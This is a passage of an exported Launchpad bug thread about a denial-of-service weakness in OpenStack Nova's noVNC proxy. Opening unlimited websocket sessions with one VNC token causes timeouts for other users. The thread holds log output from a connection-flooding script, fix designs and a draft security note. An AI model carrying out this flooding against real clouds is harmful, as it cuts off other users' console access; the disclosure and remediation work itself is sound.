{
    "status": "Won't Fix", 
    "last_updated": "2016-02-09 17:35:00.281567+00:00", 
    "description": "There is no limiting on the number of VNC sessions that can be created for a single user's VNC token.\nAny attempt to create multiple (say hundreds or thousands) of websocket connections to the VNC server\nresults in many connection timeouts. Due to these connection timeout error, other users trying to access their \nVM's VNC console cannot do so.\n\nA sample script that tries to create 100,000 connections to Nova noVNC proxy, shows timeout errors\nScript: http://paste.openstack.org/show/47254/\n\nScript output.... connections get timed out after a while\n-------------------\n....\n..\n\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\n--------------------\n\nImpact:\n1. Many of the sessions timeout. Any attempt to open other sessions also intermittently fail.\nThis can cause serious problems to users already having a running VNC session or trying to create new sessions.\n\n2. The overall performance and response times of other nova services running on the novnc host, using tcp protocol\nalso gets affected after the connection timeout errors.\n\nFor example:\nBefore running the sumulate thousands of connections program:\n$ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n+-------+---------------------------------------------------------------------------------+\n| Type  | Url                                                                             |\n+-------+---------------------------------------------------------------------------------+\n| novnc | http://10.2.3.102:6080/vnc_auto.html?token=e776dd33-422f-4b56-9f98-e317410d0212 |\n+-------+---------------------------------------------------------------------------------+\n\nreal    0m0.751s\nuser    0m0.376s\nsys     0m0.084s\n\nrohit@precise-dev-102:~/tools/websocket-client-0.7.0$ \n\nAfter running the program, the response time is quite high:\n$ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n\n+-------+---------------------------------------------------------------------------------+\n| Type  | Url                                                                             |\n+-------+---------------------------------------------------------------------------------+\n| novnc | http://10.2.3.102:6080/vnc_auto.html?token=6865d675-d852-478b-b1ee-457b092f11b9 |\n+-------+---------------------------------------------------------------------------------+\n\nreal    3m9.231s\nuser    0m0.424s\nsys     0m0.108s\n\n\nPossible solutions:\n1. Allow just 1 session per instance, and raise a new exception, say, VNCSessionAlreadyExists to reject multiple\nconnections for the same token, and return an error code to the user.\n2. Make the number of sessions allowed per instance configurable, limited by some count of sessions.\n\nHowever, both of these solutions may need to override and modify the do_proxy() method of websockify's WebSocketProxy class, \nwhich can lead to maintenance issues.\n\nAnother possible solution would be to implement some kind of callback function in websockify, to which we can pass the token\nfor reconnection. This would first need contribution to the websockify project code, and then update Nova.", 
    "tags": [
        "console"
    ], 
    "importance": "High", 
    "heat": 44, 
    "link": "https://bugs.launchpad.net/nova/+bug/1227575", 
    "owner": "None", 
    "id": 1227575, 
    "index": 1242, 
    "created": "2013-09-19 10:42:02.061312+00:00", 
    "title": "DoS style attack on noVNC server can lead to service interruption or disruption", 
    "comments": [
        {
            "content": "There is no limiting on the number of VNC sessions that can be created for a single user's VNC token.\nAny attempt to create multiple (say hundreds or thousands) of websocket connections to the VNC server\nresults in many connection timeouts. Due to these connection timeout error, other users trying to access their \nVM's VNC console cannot do so.\n\nA sample script that tries to create 100,000 connections to Nova noVNC proxy, shows timeout errors\nScript: http://paste.openstack.org/show/47254/\n\nScript output.... connections get timed out after a while\n-------------------\n....\n..\n\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\nReceived 'RFB 003.008\n'\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\nCreating Connection\nReceiving...\ntimed out\n--------------------\n\nImpact:\n1. Many of the sessions timeout. Any attempt to open other sessions also intermittently fail.\nThis can cause serious problems to users already having a running VNC session or trying to create new sessions.\n\n2. The overall performance and response times of other nova services running on the novnc host, using tcp protocol\nalso gets affected after the connection timeout errors.\n\nFor example:\nBefore running the sumulate thousands of connections program:\n$ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n+-------+---------------------------------------------------------------------------------+\n| Type  | Url                                                                             |\n+-------+---------------------------------------------------------------------------------+\n| novnc | http://10.2.3.102:6080/vnc_auto.html?token=e776dd33-422f-4b56-9f98-e317410d0212 |\n+-------+---------------------------------------------------------------------------------+\n\nreal    0m0.751s\nuser    0m0.376s\nsys     0m0.084s\n\nrohit@precise-dev-102:~/tools/websocket-client-0.7.0$ \n\nAfter running the program, the response time is quite high:\n$ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n\n+-------+---------------------------------------------------------------------------------+\n| Type  | Url                                                                             |\n+-------+---------------------------------------------------------------------------------+\n| novnc | http://10.2.3.102:6080/vnc_auto.html?token=6865d675-d852-478b-b1ee-457b092f11b9 |\n+-------+---------------------------------------------------------------------------------+\n\nreal    3m9.231s\nuser    0m0.424s\nsys     0m0.108s\n\n\nPossible solutions:\n1. Allow just 1 session per instance, and raise a new exception, say, VNCSessionAlreadyExists to reject multiple\nconnections for the same token, and return an error code to the user.\n2. Make the number of sessions allowed per instance configurable, limited by some count of sessions.\n\nHowever, both of these solutions may need to override and modify the do_proxy() method of websockify's WebSocketProxy class, \nwhich can lead to maintenance issues.\n\nAnother possible solution would be to implement some kind of callback function in websockify, to which we can pass the token\nfor reconnection. This would first need contribution to the websockify project code, and then update Nova.", 
            "date_created": "2013-09-19 10:42:02.061312+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "Thanks for the report.  I see that you assigned the bug to yourself.  Just to clarify, does that mean you're looking into writing a patch?", 
            "date_created": "2013-09-19 14:55:10.062762+00:00", 
            "author": "https://api.launchpad.net/1.0/~russellb"
        }, 
        {
            "content": "Hi Russell,\n\nYes, I am working on this bug and will post a patch to Gerrit soon.", 
            "date_created": "2013-09-20 05:08:42.152498+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "I will not submit the patch to Gerrit but attach it to this bug.", 
            "date_created": "2013-09-20 05:30:11.256305+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "All public cloud services are vulnerable to DoS on their endpoints and need to be protected using specialized proxies. Is there anything in noVNC which makes it more... vulnerable to attack ?\r\n\r\nI am all for this to be improved in the future, I just don't see how we can \"fix\" this in older versions without significantly altering their behavior or configuration (and cooridnating necessary support in a consumed library!). This is how we handled keystone DoS in the past -- by fixing it in the current release and informing users of the vulnerability through an OSSN.", 
            "date_created": "2013-09-23 15:44:05.042168+00:00", 
            "author": "https://api.launchpad.net/1.0/~ttx"
        }, 
        {
            "content": "Thierry: I completely agree with you.  We want to fix this issue in the current release by allowing only limited configurable number of vnc console sessions to be opened for each VM something like ratelimiting.", 
            "date_created": "2013-09-23 17:14:35.512012+00:00", 
            "author": "https://api.launchpad.net/1.0/~tpatil"
        }, 
        {
            "content": "Would be great if that could land in Havana before release... because like I said backporting might just not be an option. maybe making it a public issue would just increase the likelihood of it getting fixed in time.\n\nAswad: Would you object to it being made public ?\nOther VMT members: what's your take on this ? Fix in havana / OSSN for others ?", 
            "date_created": "2013-09-25 15:11:53.879612+00:00", 
            "author": "https://api.launchpad.net/1.0/~ttx"
        }, 
        {
            "content": "I completely agree, this is more or less the same class of issue as bug 1098177. Fix in master/havana, security note for <=grizzly, CVE if the OSSG/CNA feel it's warranted. And yes, I suspect this will get fixed faster/easier if not embargoed.", 
            "date_created": "2013-09-25 15:24:04.848540+00:00", 
            "author": "https://api.launchpad.net/1.0/~fungi"
        }, 
        {
            "content": "I'm not sure about opening this to the public just to rush a fix.  That seems like bad security practice.\n\nI also think we need to wait for a patch to get worked out before we speculate on whether this could be backported.  It seems doable to me.  If we're worried about the change in behavior, it can be off by default in the backport.", 
            "date_created": "2013-09-25 18:14:35.739551+00:00", 
            "author": "https://api.launchpad.net/1.0/~russellb"
        }, 
        {
            "content": "I am working on this patch and have 2 solutions discussed below. Both use sessions to maintain vnc session information/instance. \nI would like to have opinions if either of the solution looks feasible\n\nA session is maintained throughout a connection between vnc user and a given instance.\ne.g.\n\nconsole_sessions = {\n<instance_1_UUID>: [session_1_UUID, session_2_UUID, session_3_UUID........],\n<instance_1_UUID>: [session_1_UUID, session_2_UUID, session_3_UUID........],\n...\n...\n}\n\n\nSolution 1: Uses multiprocessing.Manager().dict() for vnc session management\nAdvantages:\n- session information is stored in-memory\nDisadvantages:\n- Methods start_server(), top_new_client() and new_client() from websockify.WebSocketProxy class \n  has to be overridden.\n\n\nProblem faced - *Please suggest a workaround or an alternative *\nI get an exception as shown below while using multiprocessing.Manager().dict().\nAssuming that this error is caused because socket module is being monkeypatched by eventlet.\nReferred:\nhttp://stackoverflow.com/questions/14736766/why-does-gevent-socket-break-multiprocessing-connections-auth\nhttps://groups.google.com/forum/#!msg/ruffus_discuss/kzXcedlRwuQ/ag3mKlc7B-0Js\n\nn-novnc log:\n\nTraceback (most recent call last):\nFile \"/usr/local/bin/nova-novncproxy\", line 10, in <module>\nsys.exit(main())\nFile \"/opt/stack/nova/nova/cmd/novncproxy.py\", line 89, in main\nserver.start_server()\nFile \"/opt/stack/nova/nova/console/websocketproxy.py\", line 124, in start_server\nd = manager.Namespace()\nFile \"/usr/lib/python2.7/multiprocessing/managers.py\", line 667, in temp\ntoken, exp = self._create(typeid, *args, **kwds)\nFile \"/usr/lib/python2.7/multiprocessing/managers.py\", line 565, in _create\nconn = self._Client(self._address, authkey=self._authkey)\nFile \"/usr/lib/python2.7/multiprocessing/connection.py\", line 175, in Client\nanswer_challenge(c, authkey)\nFile \"/usr/lib/python2.7/multiprocessing/connection.py\", line 413, in answer_challenge\nconnection.recv_bytes()\nIOError: [Errno 11] Resource temporarily unavailable \n\n\nSolution 2: Use external store, sqlite or memcache for vnc session management\nDisadvantages:\n- new_client method from websockify.WebSocketProxy class must be overridden.\n- It might be an overhead\n- Managing and monitoring memcache on comput node will be an overhead for administrator.\n- new_client method from websockify.WebSocketProxy class must be overridden.\n\n", 
            "date_created": "2013-09-26 14:36:17.636542+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "Each VNC session starts in a new processes. To store vnc session data about each of these sessions in a shared object (dictionary) I had to use multiprocessing.Manager.dict.\nBut since patched socket module did not allow me initialize a shared dict, I commented \"eventlet.monkey_patch(os=False)\" from __init__.py as below.\n\nDiff:\n- eventlet.monkey_patch(os=False)\n+ #eventlet.monkey_patch(os=False)\n\nRef for eventlet.monkey_patch(os=False) in __init__.py:\nhttps://github.com/openstack/nova/blob/master/nova/cmd/__init__.py#L34\n\nHowever, since these patched modules are being used by \"consoleauth_rpcapi.ConsoleAuthAPI\"; it is *not* possible to comment \"eventlet.monkey_patch(os=False)\" in nova.cmd.__init__.py. It looks like multiprocessing and eventlets don't go well together.\n\nRef for consoleauth_rpcapi.ConsoleAuthAPI:\nhttps://github.com/openstack/nova/blob/master/nova/console/websocketproxy.py#L55\n\nHence, solution#1 as described in comment#9 does not look feasible (Please suggest if there is an alternative) so,  I am going ahead with solution#2.\n\nSolution#2 uses database to store console sessions. Similar approach has been used in nova.console.vmrc_manager to store console sessions.\nRef for vmrc_manager\nhttps://github.com/openstack/nova/blob/master/nova/console/vmrc_manager.py#L76", 
            "date_created": "2013-09-27 13:25:32.047640+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "Nova devs, could you chime in ?", 
            "date_created": "2013-10-07 12:56:48.197090+00:00", 
            "author": "https://api.launchpad.net/1.0/~ttx"
        }, 
        {
            "content": "I think solution #2 makes sense.", 
            "date_created": "2013-10-07 18:48:36.647087+00:00", 
            "author": "https://api.launchpad.net/1.0/~russellb"
        }, 
        {
            "content": "PFA fix for bug <<fix_lp_bug_1227575>>", 
            "date_created": "2013-10-18 07:48:32.098860+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "nova-core please review the attached patch.\n\nDescription:\n- I have implemented solution#2 as discussed above and have reused consoles and console_pools table to achieve this.\n- Maximum number of consoles that can be open for any instance is configurable using \"console_max_count\"\n- A console data stored in consoles table, is related to one of the compute hosts on which the instance is spawned. This information is stored in console_pools table and is identified by public_hostname, host, compute_host fields.\n- All consoles associated with a console_pool are cleaned up after a compute host or novnc-proxy service comes up after a unexpected failure.\n\nFollowing scenarios are considered:\n1. Open vm console for any one of the vm, for \"console_max_count\" times in separate tabs.\nExpected: \n- All consoles should successfully open till its is count = \"console_max_count\"\n- If attempt is made to open a console session and the resulting count is > \"console_max_count\" then exception \"ConsoleMaxCountExceeded\" is raised\n\n2. Open vm console of each vm. Kill nova-console service from each server.\nExpected:\n- All console session should get disconnected.\n- Start nova-console service on each server, it should delete all previous opened consoles from the consoles table.\n- Now if you try to connect to any of the vm console, it should connect successfully.\n\n3. Open vm console of each vm. Shutdown vm using virsh command.\nExpected:\n- Console session should get disconnected and nova-console should delete the console successfully.", 
            "date_created": "2013-10-21 09:00:27.999407+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "@Nova-core: please review\n\n@VMT members: I still think we should fix this in master as a strengthening option, but not make an OSSA for it.\n", 
            "date_created": "2013-10-21 14:14:54.393299+00:00", 
            "author": "https://api.launchpad.net/1.0/~ttx"
        }, 
        {
            "content": "Agreed on treating it as a security hardening improvement, though the security group may want to issue a note on adjusting this value and/or mitigating with throttling proxies as a best practice. Also, if there's going to be no OSSA for this, then there's little point in embargoing the bug report so we should switch it to public.", 
            "date_created": "2013-10-21 14:27:47.344257+00:00", 
            "author": "https://api.launchpad.net/1.0/~fungi"
        }, 
        {
            "content": "Rob: would you agree with that ?", 
            "date_created": "2013-11-14 11:04:37.290309+00:00", 
            "author": "https://api.launchpad.net/1.0/~ttx"
        }, 
        {
            "content": "Note that this bug will likely apply to the SPICE  console proxy as well as the VNC one.\n\nAlso note that each SPICE console involves multiple TCP connections to the proxy, since the SPICE architecture uses different TCP connections for mouse, keyboard, console data and more. So we need to be careful that any max count limit is not going to break valid SPICE usage\n", 
            "date_created": "2013-11-14 11:20:33.978796+00:00", 
            "author": "https://api.launchpad.net/1.0/~berrange"
        }, 
        {
            "content": "Ok, I'm good with treating this as a strengthening issue, which means we could open this up and review the patch through gerrit.  \n\nThanks for working on the patch!  I'm sorry review has been so slow.", 
            "date_created": "2013-11-18 17:55:08.460782+00:00", 
            "author": "https://api.launchpad.net/1.0/~russellb"
        }, 
        {
            "content": "Fix proposed to branch: master\nReview: https://review.openstack.org/57224", 
            "date_created": "2013-11-19 13:24:03.229365+00:00", 
            "author": "https://api.launchpad.net/1.0/~hudson-openstack"
        }, 
        {
            "content": "I'll start preparing an OSSN for this. ", 
            "date_created": "2013-11-21 17:59:31.799847+00:00", 
            "author": "https://api.launchpad.net/1.0/~sriramhere"
        }, 
        {
            "content": "This appears to be a security issue, a single user can prevent any access for all other users to the system, with no way (currently) to prevent it. Why was this classed as security hardening and not a security flaw (am I missing something, like it can't be exploited outside of a non standard/unsafe config or something?).", 
            "date_created": "2013-11-21 21:01:23.633862+00:00", 
            "author": "https://api.launchpad.net/1.0/~kseifried"
        }, 
        {
            "content": "This one is a classic DoS attack on an endpoint, without amplification. There are two ways of mitigating that issue in a public cloud setting: externally (by deploying rate-limiting proxies) or internally (by adding a rate-limiting feature in Nova novnc proxy itself).\n\nAdding a feature to a stable release in not an option for us. So we pursue two different axis:\n- warn users of current stable versions to use rate-limiting proxies to also cover access to the noVNC servers (this is not the first, nor the last place in OpenStack where DoS needs to be mitigated externally). This is what the OSSN that Sriram prepares will recommend\n- introduce a new feature to be able to mitigate that within the noVNC proxy, to be shipped in the Icehouse release\n\nIn summary, this is definitely a vulnerability, but since it can't be closed without adding a disrupting change in stable releases (which is what an OSSA would have been for), we opted for a \"known issue warning + best practice on how to mitigate it\" (OSSN) + feature-fix in next version.", 
            "date_created": "2013-11-22 09:14:37.529694+00:00", 
            "author": "https://api.launchpad.net/1.0/~ttx"
        }, 
        {
            "content": "Hi,\n\nI have analyzed that; single sessionid is shared between multiple tcp connections for SPICE console. Now I am trying to figure out how to get this unique sessionid in NovaWebSocketProxy class. It is possible to solve this issue if this sessionid is available in NovaWebSocketProxy class.\n\nPlease suggest if anybody has a workaround for this scenario", 
            "date_created": "2013-11-29 05:51:13.235773+00:00", 
            "author": "https://api.launchpad.net/1.0/~aswad-r"
        }, 
        {
            "content": "Please review and comment on the OSSN published for this: https://wiki.openstack.org/wiki/OSSN/1227575. Content reproduced below. I wanted to know if links to some rate-limiting frameworks such as Repose would help. Not sure if we can link 3rd party tools in OSSNs. \n==================================================================================\n\n\nDoS style attack on noVNC server can lead to service interruption or disruption\n\n=== Summary===\n\nCurrently, there is no limiting on the number of VNC sessions that can be created for a single user's VNC token which enables one to cause a DoS attack on noVNC browser proxy by requesting multiple server. This prevents subsequent access to VM's VNC console.\n\n=== Affected Services / Software ===\nHorizon (VNC Console through browser), Nova (NoVNC proxy), Grizzly\n\n=== Discussion ===\nNoVNC Proxy is explained well here.\n\nOnce a user gets token to access a VM's VNC console, there is no restriction in the number of times the user can try connecting to the VNC console using the same token. If multiple connection requests are made, any subsequent request could timeout. This could impact users already connected to the VNC sessions, or other users trying to make new connection. This could also impact overall responsiveness of other nova services running in the novnc host.\n\nThus, a user could make the NoVNC proxy endpoint not responsive/ reachable, thereby resulting in a DoS attack. However, it is to be noted there is no amplification effect.\n\n=== Recommended Actions ===\nFor current stable releases (Grizzly), users need to workaround this vulnerability by using rate-limiting proxies to cover access to NoVNC hosts. Rate-limiting is a common mechanism to prevent DoS/ Brute-Force attacks. You can find more discussion on rate-limiting around OpenStack Networking Best practices here.\n\n=== Contacts / References ===\nThis OSSN : https://bugs.launchpad.net/ossn/+bug/1227575\nOriginal LaunchPad Bug : https://bugs.launchpad.net/keystone/+bug/1227575\nOpenStack Security ML : <email address hidden>\nOpenStack Security Group : https://launchpad.net/~openstack-ossg", 
            "date_created": "2013-12-19 19:09:51.928488+00:00", 
            "author": "https://api.launchpad.net/1.0/~sriramhere"
        }, 
        {
            "content": "I would slightly reword the \"Summary\" section to be a bit more clear.  I'd suggest something like this:\n\n-------------\nThere is currently no limitation on the number of VNC sessions that can be established for a single user's VNC token.  This enables one to cause a Denial of Service (DoS) style attack by establishing many VNC sessions against a single instance through a noVNC proxy.  This can cause timeouts for other users who are trying to access the same instance through VNC.\n-------------\n\nIn the \"Discussion\" section, I don't think the first sentence is needed (\"NoVNC Proxy is explained here\").  There are also some areas where I would suggest slight rewording:\n\n-------------\nOnce a user gets a token to access an instance's VNC console, there is no restriction on the frequency that the user can attempt to connect to the instance's VNC console using that token.  There is also no restriction on the number of simultaneous VNC sessions that the user can establish against the instance using a single token.  If many connection requests are made, any subsequent connection requests made by other users may time out.  This could also impact other user's currently established VNC sessions to the instance.  The overall responsiveness of other Nova services running on the noVNC host.\n\nBy taking advantage of the lack of any VNC connection limiting, a single user could cause the noVNC proxy endpoint to be non-responsive or unreachable.  This results in a DoS attack.  It should be noted that there is no amplification effect.\n-------------\n\nI think the OSSN needs to mention Havana as well.  It currently only indicates that Grizzly is affected in the \"Affected Services\" and \"Recommended Actions\" sections.\n\nYou have a few spots that use \"NoVNC\" or \"novnc\".  These should be \"noVNC\".\n\nIn the \"Recommended Actions\" section, you start to make a reference to some best practices but there is no reference.  Were you intending to refer to the Security Guide?", 
            "date_created": "2014-01-04 18:11:56.960812+00:00", 
            "author": "https://api.launchpad.net/1.0/~nkinder"
        }, 
        {
            "content": "Thanks for the comments Nathan.\n\nI wanted to check if references to 3rd party tools are allowed in the\nreference section.\n\n\nOn Sat, Jan 4, 2014 at 10:11 AM, Nathan Kinder <email address hidden> wrote:\n\n> I would slightly reword the \"Summary\" section to be a bit more clear.\n> I'd suggest something like this:\n>\n> -------------\n> There is currently no limitation on the number of VNC sessions that can be\n> established for a single user's VNC token.  This enables one to cause a\n> Denial of Service (DoS) style attack by establishing many VNC sessions\n> against a single instance through a noVNC proxy.  This can cause timeouts\n> for other users who are trying to access the same instance through VNC.\n> -------------\n>\n> In the \"Discussion\" section, I don't think the first sentence is needed\n> (\"NoVNC Proxy is explained here\").  There are also some areas where I\n> would suggest slight rewording:\n>\n> -------------\n> Once a user gets a token to access an instance's VNC console, there is no\n> restriction on the frequency that the user can attempt to connect to the\n> instance's VNC console using that token.  There is also no restriction on\n> the number of simultaneous VNC sessions that the user can establish against\n> the instance using a single token.  If many connection requests are made,\n> any subsequent connection requests made by other users may time out.  This\n> could also impact other user's currently established VNC sessions to the\n> instance.  The overall responsiveness of other Nova services running on the\n> noVNC host.\n>\n> By taking advantage of the lack of any VNC connection limiting, a single\n> user could cause the noVNC proxy endpoint to be non-responsive or\n> unreachable.  This results in a DoS attack.  It should be noted that there\n> is no amplification effect.\n> -------------\n>\n> I think the OSSN needs to mention Havana as well.  It currently only\n> indicates that Grizzly is affected in the \"Affected Services\" and\n> \"Recommended Actions\" sections.\n>\n> You have a few spots that use \"NoVNC\" or \"novnc\".  These should be\n> \"noVNC\".\n>\n> In the \"Recommended Actions\" section, you start to make a reference to\n> some best practices but there is no reference.  Were you intending to\n> refer to the Security Guide?\n>\n> --\n> You received this bug notification because you are a member of OpenStack\n> Security Group, which is subscribed to OpenStack.\n> https://bugs.launchpad.net/bugs/1227575\n>\n> Title:\n>   DoS style attack on noVNC server can lead to service interruption or\n>   disruption\n>\n> Status in OpenStack Compute (Nova):\n>   In Progress\n> Status in OpenStack Security Notes:\n>   New\n>\n> Bug description:\n>   There is no limiting on the number of VNC sessions that can be created\n> for a single user's VNC token.\n>   Any attempt to create multiple (say hundreds or thousands) of websocket\n> connections to the VNC server\n>   results in many connection timeouts. Due to these connection timeout\n> error, other users trying to access their\n>   VM's VNC console cannot do so.\n>\n>   A sample script that tries to create 100,000 connections to Nova noVNC\n> proxy, shows timeout errors\n>   Script: http://paste.openstack.org/show/47254/\n>\n>   Script output.... connections get timed out after a while\n>   -------------------\n>   ....\n>   ..\n>\n>   Creating Connection\n>   Receiving...\n>   Received 'RFB 003.008\n>   '\n>   Creating Connection\n>   Receiving...\n>   Received 'RFB 003.008\n>   '\n>   Creating Connection\n>   Receiving...\n>   Received 'RFB 003.008\n>   '\n>   Creating Connection\n>   Receiving...\n>   Received 'RFB 003.008\n>   '\n>   Creating Connection\n>   Receiving...\n>   Received 'RFB 003.008\n>   '\n>   Creating Connection\n>   Receiving...\n>   Received 'RFB 003.008\n>   '\n>   Creating Connection\n>   Receiving...\n>   timed out\n>   Creating Connection\n>   Receiving...\n>   timed out\n>   Creating Connection\n>   Receiving...\n>   timed out\n>   Creating Connection\n>   Receiving...\n>   timed out\n>   Creating Connection\n>   Receiving...\n>   timed out\n>   --------------------\n>\n>   Impact:\n>   1. Many of the sessions timeout. Any attempt to open other sessions also\n> intermittently fail.\n>   This can cause serious problems to users already having a running VNC\n> session or trying to create new sessions.\n>\n>   2. The overall performance and response times of other nova services\n> running on the novnc host, using tcp protocol\n>   also gets affected after the connection timeout errors.\n>\n>   For example:\n>   Before running the sumulate thousands of connections program:\n>   $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n>\n> +-------+---------------------------------------------------------------------------------+\n>   | Type  | Url\n>                   |\n>\n> +-------+---------------------------------------------------------------------------------+\n>   | novnc |\n> http://10.2.3.102:6080/vnc_auto.html?token=e776dd33-422f-4b56-9f98-e317410d0212|\n>\n> +-------+---------------------------------------------------------------------------------+\n>\n>   real    0m0.751s\n>   user    0m0.376s\n>   sys     0m0.084s\n>\n>   rohit@precise-dev-102:~/tools/websocket-client-0.7.0$\n>\n>   After running the program, the response time is quite high:\n>   $ time nova get-vnc-console c1b093a3-f53b-4282-b89c-e68f0fa1b6e5  novnc\n>\n>\n> +-------+---------------------------------------------------------------------------------+\n>   | Type  | Url\n>                   |\n>\n> +-------+---------------------------------------------------------------------------------+\n>   | novnc |\n> http://10.2.3.102:6080/vnc_auto.html?token=6865d675-d852-478b-b1ee-457b092f11b9|\n>\n> +-------+---------------------------------------------------------------------------------+\n>\n>   real    3m9.231s\n>   user    0m0.424s\n>   sys     0m0.108s\n>\n>\n>   Possible solutions:\n>   1. Allow just 1 session per instance, and raise a new exception, say,\n> VNCSessionAlreadyExists to reject multiple\n>   connections for the same token, and return an error code to the user.\n>   2. Make the number of sessions allowed per instance configurable,\n> limited by some count of sessions.\n>\n>   However, both of these solutions may need to override and modify the\n> do_proxy() method of websockify's WebSocketProxy class,\n>   which can lead to maintenance issues.\n>\n>   Another possible solution would be to implement some kind of callback\n> function in websockify, to which we can pass the token\n>   for reconnection. This would first need contribution to the websockify\n> project code, and then update Nova.\n>\n> To manage notifications about this bug go to:\n> https://bugs.launchpad.net/nova/+bug/1227575/+subscriptions\n>\n> _______________________________________________\n> Openstack-security mailing list\n> <email address hidden>\n> http://lists.openstack.org/cgi-bin/mailman/listinfo/openstack-security\n>\n\n\n\n-- \nThanks,\n-Sriram\n", 
            "date_created": "2014-01-06 18:03:05+00:00", 
            "author": "https://api.launchpad.net/1.0/~sriramhere"
        }, 
        {
            "content": "Hi,\n\nIn spiceconsole when sending request to websocket server \"payload\" of websocket is getting converted to javascript ArrayBuffer (https://github.com/metacloud/spice-html5/blob/master/spiceconn.js#L126) and then while converting \"message\" to arraybuffer connection_id is getting converted to 32 bit integer (https://github.com/metacloud/spice-html5/blob/master/spicemsg.js#L118). This connection_id then gets encrypted (using anding and bit shifting of 32 bit integer) (https://github.com/metacloud/spice-html5/blob/master/spicedataview.js#L84).\n\nAt the servers side we get this \"message\" in recv_frames method of websocket(https://github.com/kanaka/websockify/blob/master/websockify/websocket.py#L337). This message is then decrypted and we get payload in hex format (https://github.com/kanaka/websockify/blob/master/websockify/websocket.py#L348). In this payload first four bytes is connection_id but it is in hex encrypted format.\nAs data received from client is in hex format, its difficult to retrive the connection_id in user readable format.\n\nTo overcome this issue, IMO the sessions need to be managed only in case of NoVncConsole and if the console is SpiceConsole then  there is no need to manage the sessions.\nFor this purpose one flag (is_vnc = true/false) will be passed from novncproxy to determine the console type while creating the server object(websocketproxy.NovaWebSocketProxy).\n\nPlease let me know if you found any workaround for the same.", 
            "date_created": "2014-01-07 12:17:24.956792+00:00", 
            "author": "https://api.launchpad.net/1.0/~abhishek-kekane"
        }, 
        {
            "content": "There is precedent for having external references in an OSSN.  For example, this OSSN refers to the Apache wiki:\n\n    https://wiki.openstack.org/wiki/OSSN/1155566\n\nI would suggest that you make it clear that the any third party tools mentioned are possible solutions, not the only solution as there may be other tools out there that can be used for limiting.", 
            "date_created": "2014-01-08 15:32:26.479963+00:00", 
            "author": "https://api.launchpad.net/1.0/~nkinder"
        }, 
        {
            "content": "Hi,\n\nTo bypass the session management for spice console, we can use template-method design pattern in NovaWebSocketProxy class.\nImplement \"new_client\" as a template method in the NovaWebSocketProxy class.\nFrom this method, invoke create_console/remove_console method to manage sessions.\nWe can now create two new classes one for NoVncConsole and another for SpiceConsole in websocketproxy.py; extending NovaWebSocketProxy class and implements create_console/remove_console methods as per our need.\n\nThe advantage of using template method design pattern is new_client method will be common for NoVncConsole and SpiceConsole.\n\nPlease let me know if you have any suggestions for the same.", 
            "date_created": "2014-01-29 10:30:46.831687+00:00", 
            "author": "https://api.launchpad.net/1.0/~abhishek-kekane"
        }, 
        {
            "content": "Hi,\n\nOne possible solution to limit the console sessions for both vnc and spice consoles is that we can query to compute node to know how many tcp connections are established for a given console graphics port of the vm using netstat command. If the number of established tcp connections exceeds that of configured value, then it is possible to restrict users from connecting to the console.\n\nsudo netstat -pnt | awk '{print $4}' | egrep '^127.0.0.1:5900$\u2019\n127.0.0.1 : vncserver_listen parameter from nova.conf\n5900: graphics port either for spice or vnc.\n\nFor this to work, we need to know whether the tcp connections per spice console is governed by libvirt or there are any other external factors involved that could vary the count of the tcp connections. Once we know count of tcp connections are bound to libvirt then we can write the logic in the libvirt driver to return tcp connections count accordingly per console type (spice or vnc).\n\nAlso need to check how this would work for other hypervisors.\n\nAdvantage:\n1. No need to persist connection data per vm per session saving disk space\n\nDisadvantage:\n1. One additional rpc call to the compute node per console\n\nPlease let me know your suggestions on the same. ", 
            "date_created": "2014-03-05 07:41:27.487709+00:00", 
            "author": "https://api.launchpad.net/1.0/~abhishek-kekane"
        }, 
        {
            "content": "Nathan, \n\nI've incorporated the review comments in the OSSN (https://wiki.openstack.org/wiki/OSSN/1227575). Apologize in the delay. I think OSSN is ready to be published now. Please let me know\n\nthanks,\n-Sriram", 
            "date_created": "2014-03-07 22:40:06.747994+00:00", 
            "author": "https://api.launchpad.net/1.0/~sriramhere"
        }, 
        {
